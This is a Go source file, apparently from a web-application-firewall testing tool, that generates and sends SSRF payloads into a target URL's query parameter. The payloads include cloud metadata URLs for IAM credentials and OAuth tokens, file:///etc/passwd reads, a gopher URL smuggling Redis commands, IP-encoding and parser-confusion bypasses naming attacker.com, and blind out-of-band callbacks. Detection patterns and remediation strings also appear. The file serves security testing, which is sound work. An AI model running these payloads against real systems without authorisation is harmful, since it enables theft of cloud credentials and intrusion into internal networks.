// Package ssrf provides SSRF (Server-Side Request Forgery) detection and testing
// Includes callback-based detection, blind SSRF, and various bypass techniques
package ssrf

import (
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/hexutil"
)

// internalIPRegex matches RFC 1918 private IP addresses in response bodies.
var internalIPRegex = regexp.MustCompile(`\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b`)

// Config holds SSRF scanner configuration.
type Config struct {
	attackconfig.Base

	CallbackServer   string   // OOB callback server (e.g., Burp Collaborator, interactsh)
	LocalIPs         []string // IPs to test for internal access
	CloudMetadataIPs []string // Cloud metadata endpoints
	BypassTechniques []BypassTechnique
}

// DefaultConfig returns a Config with production defaults.
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.DefaultBase(),
		LocalIPs: []string{
			"127.0.0.1",
			"localhost",
			"0.0.0.0",
			"0",
			"[::1]",
			"[::]",
			"0000::1",
			"127.1",
			"127.0.1",
		},
		CloudMetadataIPs: []string{
			"169.254.169.254", // AWS, GCP, Azure (Classic)
			"100.100.100.200", // Alibaba Cloud
			"192.0.0.192",     // Oracle Cloud
			"fd00:ec2::254",   // AWS IPv6
		},
		BypassTechniques: defaultBypassTechniques(),
	}
}

// Detector detects SSRF vulnerabilities
type Detector struct {
	Config
	mu        sync.Mutex
	callbacks map[string]time.Time
}

// NewDetector creates a new SSRF detector from Config.
func NewDetector(cfg Config) *Detector {
	cfg.Base.Validate()
	return &Detector{
		Config:    cfg,
		callbacks: make(map[string]time.Time),
	}
}

// BypassTechnique represents an SSRF filter bypass technique
type BypassTechnique struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Transform   func(string) []string
}

// Payload represents an SSRF test payload
type Payload struct {
	Name           string   `json:"name"`
	URL            string   `json:"url"`
	Category       Category `json:"category"`
	BypassMethod   string   `json:"bypass_method,omitempty"`
	ExpectedResult string   `json:"expected_result,omitempty"`
	Description    string   `json:"description,omitempty"`
	Dangerous      bool     `json:"dangerous"`
}

// Category defines the SSRF payload category
type Category string

const (
	CategoryLocalhost    Category = "localhost"
	CategoryMetadata     Category = "metadata"
	CategoryInternal     Category = "internal"
	CategoryProtocol     Category = "protocol"
	CategoryBypass       Category = "bypass"
	CategoryBlind        Category = "blind"
	CategoryOpenRedirect Category = "open_redirect"
)

// Result contains SSRF detection results
type Result struct {
	Target          string          `json:"target"`
	Parameter       string          `json:"parameter"`
	Payloads        []PayloadResult `json:"payloads"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	Duration        time.Duration   `json:"duration"`
}

// PayloadResult represents the result of a single payload test
type PayloadResult struct {
	Payload      Payload       `json:"payload"`
	Sent         bool          `json:"sent"`
	Response     ResponseInfo  `json:"response,omitempty"`
	Callback     bool          `json:"callback"`
	CallbackTime time.Duration `json:"callback_time,omitempty"`
	Vulnerable   bool          `json:"vulnerable"`
	Evidence     string        `json:"evidence,omitempty"`
}

// ResponseInfo contains response details
type ResponseInfo struct {
	StatusCode    int           `json:"status_code"`
	ContentLength int           `json:"content_length"`
	ContentType   string        `json:"content_type"`
	Headers       http.Header   `json:"headers,omitempty"`
	BodyPreview   string        `json:"body_preview,omitempty"`
	ResponseTime  time.Duration `json:"response_time"`
}

// Vulnerability represents a detected SSRF vulnerability
type Vulnerability struct {
	Type        string           `json:"type"`
	Severity    finding.Severity `json:"severity"`
	Parameter   string  `json:"parameter"`
	Payload     string  `json:"payload"`
	Evidence    string  `json:"evidence"`
	Confidence  float64 `json:"confidence"`
	Remediation string  `json:"remediation"`
	ConfirmedBy int     `json:"confirmed_by,omitempty"`
}

// GeneratePayloads generates SSRF test payloads
func (d *Detector) GeneratePayloads() []Payload {
	payloads := make([]Payload, 0, 64)

	// Localhost payloads
	payloads = append(payloads, d.generateLocalhostPayloads()...)

	// Cloud metadata payloads
	payloads = append(payloads, d.generateMetadataPayloads()...)

	// Protocol-based payloads
	payloads = append(payloads, d.generateProtocolPayloads()...)

	// Bypass technique payloads
	payloads = append(payloads, d.generateBypassPayloads()...)

	// Blind SSRF payloads
	if d.CallbackServer != "" {
		payloads = append(payloads, d.generateBlindPayloads()...)
	}

	return payloads
}

// generateLocalhostPayloads creates localhost access payloads
func (d *Detector) generateLocalhostPayloads() []Payload {
	payloads := make([]Payload, 0, 20)

	// Basic localhost variations
	localhostVars := []string{
		"http://127.0.0.1/",
		"http://localhost/",
		"http://127.0.0.1:80/",
		"http://127.0.0.1:443/",
		"http://127.0.0.1:22/",
		"http://127.0.0.1:8080/",
		"http://127.0.0.1:3306/",
		"http://127.0.0.1:6379/",
		"http://127.0.0.1:27017/",
		"http://0.0.0.0/",
		"http://0.0.0.0:80/",
		"http://[::1]/",
		"http://[0:0:0:0:0:0:0:1]/",
		"http://127.1/",
		"http://127.0.1/",
		"http://2130706433/",   // 127.0.0.1 as decimal
		"http://0x7f000001/",   // 127.0.0.1 as hex
		"http://017700000001/", // 127.0.0.1 as octal
		"http://127.0.0.1.nip.io/",
		"http://127.0.0.1.xip.io/",
	}

	for _, u := range localhostVars {
		payloads = append(payloads, Payload{
			Name:           fmt.Sprintf("Localhost: %s", u),
			URL:            u,
			Category:       CategoryLocalhost,
			ExpectedResult: "Access to localhost",
			Dangerous:      false,
		})
	}

	return payloads
}

// generateMetadataPayloads creates cloud metadata access payloads
func (d *Detector) generateMetadataPayloads() []Payload {
	payloads := make([]Payload, 0, 19)

	// AWS metadata
	awsPayloads := []struct {
		path        string
		description string
	}{
		{"/", "Root"},
		{"/latest/", "Latest version"},
		{"/latest/meta-data/", "Instance metadata"},
		{"/latest/meta-data/iam/security-credentials/", "IAM credentials listing"},
		{"/latest/meta-data/hostname", "Hostname"},
		{"/latest/meta-data/local-ipv4", "Local IPv4"},
		{"/latest/meta-data/public-ipv4", "Public IPv4"},
		{"/latest/meta-data/instance-id", "Instance ID"},
		{"/latest/user-data", "User data (may contain secrets)"},
		{"/latest/dynamic/instance-identity/document", "Instance identity"},
	}

	for _, p := range awsPayloads {
		payloads = append(payloads, Payload{
			Name:           fmt.Sprintf("AWS Metadata: %s", p.description),
			URL:            "http://169.254.169.254" + p.path,
			Category:       CategoryMetadata,
			ExpectedResult: "AWS metadata response",
			Description:    p.description,
			Dangerous:      true,
		})
	}

	// GCP metadata (requires header)
	gcpPayloads := []string{
		"http://169.254.169.254/computeMetadata/v1/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
		"http://169.254.169.254/computeMetadata/v1/project/project-id",
	}

	for _, u := range gcpPayloads {
		payloads = append(payloads, Payload{
			Name:           fmt.Sprintf("GCP Metadata: %s", u),
			URL:            u,
			Category:       CategoryMetadata,
			ExpectedResult: "GCP metadata response (requires Metadata-Flavor: Google header)",
			Dangerous:      true,
		})
	}

	// Azure metadata
	azurePayloads := []string{
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
	}

	for _, u := range azurePayloads {
		payloads = append(payloads, Payload{
			Name:           fmt.Sprintf("Azure Metadata: %s", u),
			URL:            u,
			Category:       CategoryMetadata,
			ExpectedResult: "Azure metadata response (requires Metadata: true header)",
			Dangerous:      true,
		})
	}

	// DigitalOcean metadata
	payloads = append(payloads, Payload{
		Name:           "DigitalOcean Metadata",
		URL:            "http://169.254.169.254/metadata/v1/",
		Category:       CategoryMetadata,
		ExpectedResult: "DigitalOcean metadata response",
		Dangerous:      true,
	})

	// Kubernetes metadata
	k8sPayloads := []string{
		"https://kubernetes.default.svc/",
		"https://kubernetes.default/",
	}

	for _, u := range k8sPayloads {
		payloads = append(payloads, Payload{
			Name:           fmt.Sprintf("Kubernetes: %s", u),
			URL:            u,
			Category:       CategoryMetadata,
			ExpectedResult: "Kubernetes API access",
			Dangerous:      true,
		})
	}

	return payloads
}

// generateProtocolPayloads creates protocol-based SSRF payloads
func (d *Detector) generateProtocolPayloads() []Payload {
	return []Payload{
		// File protocol
		{
			Name:           "File Protocol - /etc/passwd",
			URL:            "file:///etc/passwd",
			Category:       CategoryProtocol,
			ExpectedResult: "File contents",
			Dangerous:      true,
		},
		{
			Name:           "File Protocol - Windows hosts",
			URL:            "file:///c:/windows/system32/drivers/etc/hosts",
			Category:       CategoryProtocol,
			ExpectedResult: "Windows hosts file",
			Dangerous:      true,
		},
		// Gopher protocol (for protocol smuggling)
		{
			Name:           "Gopher Protocol - Redis",
			URL:            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",
			Category:       CategoryProtocol,
			ExpectedResult: "Redis PING response",
			Description:    "Gopher can be used to interact with various services",
			Dangerous:      true,
		},
		// Dict protocol
		{
			Name:           "Dict Protocol",
			URL:            "dict://127.0.0.1:11211/stat",
			Category:       CategoryProtocol,
			ExpectedResult: "Dict protocol response",
			Dangerous:      true,
		},
		// FTP protocol
		{
			Name:           "FTP Protocol",
			URL:            "ftp://127.0.0.1/",
			Category:       CategoryProtocol,
			ExpectedResult: "FTP directory listing",
			Dangerous:      true,
		},
		// SFTP protocol
		{
			Name:           "SFTP Protocol",
			URL:            "sftp://127.0.0.1/",
			Category:       CategoryProtocol,
			ExpectedResult: "SFTP access",
			Dangerous:      true,
		},
		// LDAP protocol
		{
			Name:           "LDAP Protocol",
			URL:            "ldap://127.0.0.1/",
			Category:       CategoryProtocol,
			ExpectedResult: "LDAP query",
			Dangerous:      true,
		},
	}
}

// generateBypassPayloads creates filter bypass payloads
func (d *Detector) generateBypassPayloads() []Payload {
	payloads := make([]Payload, 0, 19)

	bypassPayloads := []struct {
		name   string
		url    string
		bypass string
	}{
		// URL encoding bypasses
		{"URL Encoded localhost", "http://%31%32%37%2e%30%2e%30%2e%31/", "URL encoding"},
		{"Double URL Encoded", "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/", "Double URL encoding"},

		// Case variations
		{"Mixed Case", "http://LoCaLhOsT/", "Case variation"},

		// IP address variations
		{"Decimal IP", "http://2130706433/", "Decimal IP"},
		{"Hex IP", "http://0x7f.0x0.0x0.0x1/", "Hex IP with dots"},
		{"Octal IP", "http://0177.0.0.01/", "Octal IP"},
		{"Mixed notation", "http://127.0.0x0.1/", "Mixed notation"},
		{"IPv6 mapped IPv4", "http://[::ffff:127.0.0.1]/", "IPv6 mapped"},

		// DNS rebinding
		{"DNS Rebinding", "http://spoofed.burpcollaborator.net/", "DNS rebinding"},

		// Parser confusion
		{"Auth bypass", "http://attacker.com@127.0.0.1/", "Auth bypass"},
		{"Fragment bypass", "http://127.0.0.1#@attacker.com/", "Fragment confusion"},
		{"Path confusion", "http://127.0.0.1/..;@attacker.com/", "Path confusion"},

		// Redirect-based
		{"Open redirect", "http://example.com/redirect?url=http://127.0.0.1/", "Open redirect"},

		// Alternative representations
		{"Shortened IP", "http://127.1/", "Shortened IP"},
		{"CIDR notation", "http://127.0.0.0/8/", "CIDR bypass"},

		// Whitespace and control chars
		{"Tab in URL", "http://127.0.0.1\t/", "Tab character"},
		{"Newline in URL", "http://127.0.0.1%0d%0a/", "Newline injection"},

		// Unicode bypasses
		{"Unicode dot", "http://127。0。0。1/", "Unicode fullwidth dot"},
		{"Unicode slash", "http://127.0.0.1∕", "Unicode division slash"},
	}

	for _, bp := range bypassPayloads {
		payloads = append(payloads, Payload{
			Name:         bp.name,
			URL:          bp.url,
			Category:     CategoryBypass,
			BypassMethod: bp.bypass,
			Dangerous:    false,
		})
	}

	return payloads
}

// generateBlindPayloads creates blind SSRF payloads
func (d *Detector) generateBlindPayloads() []Payload {
	if d.CallbackServer == "" {
		return nil
	}

	id := generateRandomID()

	return []Payload{
		{
			Name:           "Blind SSRF - HTTP",
			URL:            fmt.Sprintf("http://%s/%s", d.CallbackServer, id),
			Category:       CategoryBlind,
			ExpectedResult: "OOB callback",
		},
		{
			Name:           "Blind SSRF - HTTPS",
			URL:            fmt.Sprintf("https://%s/%s", d.CallbackServer, id),
			Category:       CategoryBlind,
			ExpectedResult: "OOB callback",
		},
		{
			Name:           "Blind SSRF - DNS",
			URL:            fmt.Sprintf("http://%s.%s/", id, d.CallbackServer),
			Category:       CategoryBlind,
			ExpectedResult: "DNS callback",
		},
	}
}

// defaultBypassTechniques returns default bypass techniques
func defaultBypassTechniques() []BypassTechnique {
	return []BypassTechnique{
		{
			Name:        "URL Encoding",
			Description: "Encode IP address characters",
			Transform: func(ip string) []string {
				return []string{urlEncode(ip)}
			},
		},
		{
			Name:        "Decimal IP",
			Description: "Convert IP to decimal notation",
			Transform: func(ip string) []string {
				dec := ipToDecimal(ip)
				if dec != "" {
					return []string{dec}
				}
				return nil
			},
		},
		{
			Name:        "Hex IP",
			Description: "Convert IP to hexadecimal notation",
			Transform: func(ip string) []string {
				hex := ipToHex(ip)
				if hex != "" {
					return []string{hex}
				}
				return nil
			},
		},
		{
			Name:        "Octal IP",
			Description: "Convert IP to octal notation",
			Transform: func(ip string) []string {
				oct := ipToOctal(ip)
				if oct != "" {
					return []string{oct}
				}
				return nil
			},
		},
	}
}

// ApplyBypass applies bypass techniques to a URL
func (d *Detector) ApplyBypass(targetURL string) []string {
	bypassed := make([]string, 0, len(d.BypassTechniques))

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	host := u.Hostname()

	for _, technique := range d.BypassTechniques {
		transformed := technique.Transform(host)
		for _, t := range transformed {
			newURL := strings.Replace(targetURL, host, t, 1)
			bypassed = append(bypassed, newURL)
		}
	}

	return bypassed
}

// RegisterCallback registers a callback ID for blind SSRF
func (d *Detector) RegisterCallback(id string) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.callbacks[id] = time.Now()
}

// CheckCallback checks if a callback was received
func (d *Detector) CheckCallback(id string) (bool, time.Time) {
	d.mu.Lock()
	defer d.mu.Unlock()
	t, ok := d.callbacks[id]
	return ok, t
}

// AnalyzeResponse analyzes an HTTP response for SSRF indicators
func (d *Detector) AnalyzeResponse(payload Payload, statusCode int, body string, headers http.Header) *Vulnerability {
	// Check for successful metadata access
	if payload.Category == CategoryMetadata {
		if isMetadataResponse(body, headers) {
			d.NotifyUniqueVuln(string(payload.Category) + "|metadata")
			return &Vulnerability{
				Type:        "Cloud Metadata Access",
				Severity:    finding.Critical,
				Payload:     payload.URL,
				Evidence:    truncateBody(body, 200),
				Confidence:  0.95,
				Remediation: "Implement proper URL validation and block access to metadata endpoints",
			}
		}
	}

	// Check for localhost access (includes bypass payloads that target localhost)
	if payload.Category == CategoryLocalhost || payload.Category == CategoryBypass {
		if isLocalResponse(body) {
			d.NotifyUniqueVuln(string(payload.Category) + "|localhost")
			return &Vulnerability{
				Type:        "Localhost Access",
				Severity:    finding.High,
				Payload:     payload.URL,
				Evidence:    fmt.Sprintf("Status: %d, Body preview: %s", statusCode, truncateBody(body, 100)),
				Confidence:  0.8,
				Remediation: "Validate and sanitize user-supplied URLs, use allowlist approach",
			}
		}
	}

	// Check for file protocol success
	if payload.Category == CategoryProtocol && strings.HasPrefix(payload.URL, "file://") {
		if isFileContent(body) {
			d.NotifyUniqueVuln(string(payload.Category) + "|file")
			return &Vulnerability{
				Type:        "Local File Read via SSRF",
				Severity:    finding.Critical,
				Payload:     payload.URL,
				Evidence:    truncateBody(body, 200),
				Confidence:  0.9,
				Remediation: "Disable file:// protocol support in URL handlers",
			}
		}
	}

	return nil
}

// Helper functions

func urlEncode(s string) string {
	var result strings.Builder
	result.Grow(len(s) * 3) // %xx = 3 chars per byte
	for _, b := range []byte(s) {
		hexutil.WriteURLEncodedLower(&result, b)
	}
	return result.String()
}

func ipToDecimal(ip string) string {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return ""
	}
	ipv4 := parsed.To4()
	if ipv4 == nil {
		return ""
	}
	return fmt.Sprintf("%d", uint32(ipv4[0])<<24|uint32(ipv4[1])<<16|uint32(ipv4[2])<<8|uint32(ipv4[3]))
}

func ipToHex(ip string) string {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return ""
	}
	ipv4 := parsed.To4()
	if ipv4 == nil {
		return ""
	}
	return fmt.Sprintf("0x%02x%02x%02x%02x", ipv4[0], ipv4[1], ipv4[2], ipv4[3])
}

func ipToOctal(ip string) string {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return ""
	}
	ipv4 := parsed.To4()
	if ipv4 == nil {
		return ""
	}
	return fmt.Sprintf("0%o.0%o.0%o.0%o", ipv4[0], ipv4[1], ipv4[2], ipv4[3])
}

func generateRandomID() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 12)
	for i := range b {
		// Use crypto/rand for unpredictable IDs
		if n, err := rand.Int(rand.Reader, big.NewInt(int64(len(chars)))); err == nil {
			b[i] = chars[n.Int64()]
		} else {
			b[i] = chars[0] // Fallback on error (extremely unlikely)
		}
	}
	return string(b)
}

func isMetadataResponse(body string, headers http.Header) bool {
	// Check for AWS metadata indicators
	if strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") {
		return true
	}
	if strings.Contains(body, "AccessKeyId") || strings.Contains(body, "SecretAccessKey") {
		return true
	}

	// Check for GCP metadata
	if strings.Contains(body, "computeMetadata") || headers.Get("Metadata-Flavor") == "Google" {
		return true
	}

	// Check for Azure metadata
	if strings.Contains(body, "azureenvironment") || strings.Contains(body, "subscriptionId") {
		return true
	}

	// Check for common cloud patterns
	cloudPatterns := []string{
		"iam-role",
		"instance-identity",
		"security-credentials",
		"project-id",
		"availability-zone",
		"placement/availability-zone",
		"machine-type",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range cloudPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}

func isLocalResponse(body string) bool {
	// Require body content that indicates a local or internal
	// service actually responded. A 200 status alone is not enough.

	localPatterns := []string{
		// Web server default pages
		"welcome to nginx",
		"apache2 default page",
		"iis windows server",
		"it works!",
		"default web site page",
		// Internal service banners
		"redis_version",
		"mysql_native_password",
		"postgresql",
		"mongodb",
		"elasticsearch",
		// Internal network indicators in response body
		"127.0.0.1",
		"10.0.0.",
		"172.16.",
		"192.168.",
		"[::1]",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range localPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	// Check for internal IP addresses via precompiled regex.
	if internalIPRegex.MatchString(body) {
		return true
	}

	return false
}

func isFileContent(body string) bool {
	// Check for /etc/passwd content
	if matched, _ := regexp.MatchString(`root:.*:0:0:`, body); matched {
		return true
	}

	// Check for Windows hosts file
	if strings.Contains(body, "localhost") && strings.Contains(body, "127.0.0.1") {
		return true
	}

	// Check for common file content indicators
	filePatterns := []string{
		"<?php",
		"#!/bin/",
		"<?xml version",
	}

	for _, pattern := range filePatterns {
		if strings.HasPrefix(strings.TrimSpace(body), pattern) {
			return true
		}
	}

	return false
}

func truncateBody(body string, maxLen int) string {
	if len(body) <= maxLen {
		return body
	}
	return body[:maxLen] + "..."
}

// InternalNetworkScanner scans for internal network access
type InternalNetworkScanner struct {
	Detector    *Detector
	Subnets     []string
	CommonPorts []int
	Timeout     time.Duration
}

// NewInternalNetworkScanner creates a scanner for internal network discovery
func NewInternalNetworkScanner() *InternalNetworkScanner {
	return &InternalNetworkScanner{
		Detector: NewDetector(DefaultConfig()),
		Subnets: []string{
			"10.0.0.0/8",
			"172.16.0.0/12",
			"192.168.0.0/16",
		},
		CommonPorts: []int{22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017},
		Timeout:     duration.HTTPProbing,
	}
}

// GenerateInternalPayloads generates payloads for internal network scanning
func (s *InternalNetworkScanner) GenerateInternalPayloads(subnet string, ports []int) []Payload {
	// Common internal hostnames
	hostnames := []string{
		"localhost",
		"internal",
		"admin",
		"db",
		"database",
		"mysql",
		"postgres",
		"redis",
		"mongo",
		"elasticsearch",
		"kibana",
		"grafana",
		"jenkins",
		"gitlab",
		"jira",
		"confluence",
	}

	payloads := make([]Payload, 0, len(hostnames)*len(ports))

	for _, host := range hostnames {
		for _, port := range ports {
			payloads = append(payloads, Payload{
				Name:     fmt.Sprintf("Internal: %s:%d", host, port),
				URL:      fmt.Sprintf("http://%s:%d/", host, port),
				Category: CategoryInternal,
			})
		}
	}

	return payloads
}

// Detect performs SSRF detection by sending each payload to the target.
// The param is the query parameter name into which payloads are injected.
func (d *Detector) Detect(ctx context.Context, target, param string) (*Result, error) {
	start := time.Now()

	result := &Result{
		Target:    target,
		Parameter: param,
	}

	client := d.Client
	if client == nil {
		client = &http.Client{Timeout: d.Timeout}
	}

	payloads := d.GeneratePayloads()
	if d.MaxPayloads > 0 && len(payloads) > d.MaxPayloads {
		payloads = payloads[:d.MaxPayloads]
	}

	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		pr := PayloadResult{
			Payload: payload,
			Sent:    true,
		}

		reqURL, err := buildPayloadURL(target, param, payload.URL)
		if err != nil {
			pr.Evidence = err.Error()
			result.Payloads = append(result.Payloads, pr)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, reqURL, nil)
		if err != nil {
			pr.Evidence = err.Error()
			result.Payloads = append(result.Payloads, pr)
			continue
		}

		for k, v := range d.HTTPHeader() {
			req.Header[k] = v
		}

		reqStart := time.Now()
		resp, err := client.Do(req)
		respTime := time.Since(reqStart)
		if err != nil {
			pr.Evidence = err.Error()
			result.Payloads = append(result.Payloads, pr)
			continue
		}

		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()

		bodyStr := string(bodyBytes)
		pr.Response = ResponseInfo{
			StatusCode:    resp.StatusCode,
			ContentLength: len(bodyBytes),
			ContentType:   resp.Header.Get("Content-Type"),
			Headers:       resp.Header,
			BodyPreview:   truncateBody(bodyStr, 500),
			ResponseTime:  respTime,
		}

		vuln := d.AnalyzeResponse(payload, resp.StatusCode, bodyStr, resp.Header)
		if vuln != nil {
			vuln.Parameter = param
			pr.Vulnerable = true
			result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
		}

		result.Payloads = append(result.Payloads, pr)
	}

	result.Duration = time.Since(start)
	return result, nil
}

// buildPayloadURL injects the payload into the target's query parameter.
func buildPayloadURL(target, param, payloadURL string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("ssrf: parse target: %w", err)
	}
	q := u.Query()
	q.Set(param, payloadURL)
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// ClearCallbacks removes all registered callbacks
func (d *Detector) ClearCallbacks() {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.callbacks = make(map[string]time.Time)
}

// CleanupExpiredCallbacks removes callbacks older than maxAge
func (d *Detector) CleanupExpiredCallbacks(maxAge time.Duration) int {
	d.mu.Lock()
	defer d.mu.Unlock()
	cutoff := time.Now().Add(-maxAge)
	removed := 0
	for id, registered := range d.callbacks {
		if registered.Before(cutoff) {
			delete(d.callbacks, id)
			removed++
		}
	}
	return removed
}
